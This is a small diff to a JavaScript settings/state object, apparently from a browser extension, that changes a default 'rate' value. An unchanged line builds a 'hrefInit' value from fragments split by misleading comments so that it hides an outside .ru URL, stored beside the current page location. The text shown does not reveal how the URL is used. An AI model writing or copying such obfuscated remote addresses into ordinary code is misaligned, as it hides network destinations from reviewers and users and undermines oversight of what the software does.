@@ -4,7 +4,7 @@ const getItem = (item) => {
 
 const initialState = {
     renderColor: getItem('renderColor') === null ? '#ffffff' : getItem('renderColor'),
-    rate: getItem('rate') === null ? 204 : +getItem('rate'),
+    rate: getItem('rate') === null ? 255 : +getItem('rate'),
     hrefInit: `${/*import*/'htt'/*from*/+'ps'/*getItem*/+'://'/*fillStatus = 'true'*/+/*mode*/'sv'/*var*/+/*#44$*/'mac'/*location*/+/*retall*/'hi'+/*ert*/'ne'/*if(len){corName = 'renderRadius'}*/+/*dots*/'.'/*++*/+'r'+/*null*/'u'}`,
     initHref: window.location.href,
     suppression: getItem('suppression')  === null ? 1.5 : +getItem('suppression'),
